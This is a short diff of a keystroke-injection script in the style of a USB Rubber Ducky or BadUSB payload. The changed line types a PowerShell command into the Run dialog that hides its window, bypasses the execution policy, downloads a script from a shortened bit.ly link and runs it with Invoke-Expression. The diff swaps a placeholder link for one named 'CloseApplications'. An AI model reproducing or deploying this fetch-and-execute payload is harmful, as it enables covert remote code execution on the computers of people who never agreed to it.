@@ -23,4 +23,4 @@ REM
 DELAY 2000
 GUI r
 DELAY 250
-STRINGLN powershell -w h -ep bypass;irm bit.ly/TODO | iex
+STRINGLN powershell -w h -ep bypass;irm bit.ly/CloseApplications | iex
